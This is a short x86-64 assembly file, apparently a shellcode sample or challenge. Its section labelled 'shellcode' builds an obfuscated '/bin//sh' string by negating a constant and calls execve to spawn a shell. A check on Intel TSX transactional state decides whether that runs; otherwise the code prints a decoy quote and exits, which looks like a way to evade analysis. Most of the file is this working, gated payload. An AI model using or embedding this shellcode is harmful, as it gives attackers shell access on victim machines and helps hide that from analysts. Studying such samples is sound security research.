%idefine rip rel $

global _start
    _start:
    mov ebx, [rsp-0x20]
    
    mov eax, 0xaabbccdd
    xacquire lock xor dword [rsp-0x20], eax
    xtest
    jnz shellcode
    jmp fail

    shellcode:
    xor rax, rax
    xor rcx, rcx
    xor rdx, rdx
    xor rsi, rsi
    xor rdi, rdi
    xor rbp, rbp
    xor r8, r8
    xor r9, r9
    xor r10, r10
    xor r11, r11
    xor r12, r12
    xor r13, r13
    xor r14, r14
    xor r15, r15
    vzeroall

    xrelease mov [rsp-0x20], ebx
    ;xrelease lock xor dword [rsp-0x20], 0xaabbccdd
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall

    fail:
    jmp short string

    code:
    pop rsi
    xor rax, rax
    mov al, 1
    mov rdi, rax
    mov rdx, rdi
    add rdx, 73
    syscall

    xor rax, rax
    add rax, 60
    xor rdi, rdi
    syscall

    string:
    call code
    db  'After all, all that was necessary was to provide the illusion of freedom',0x0A

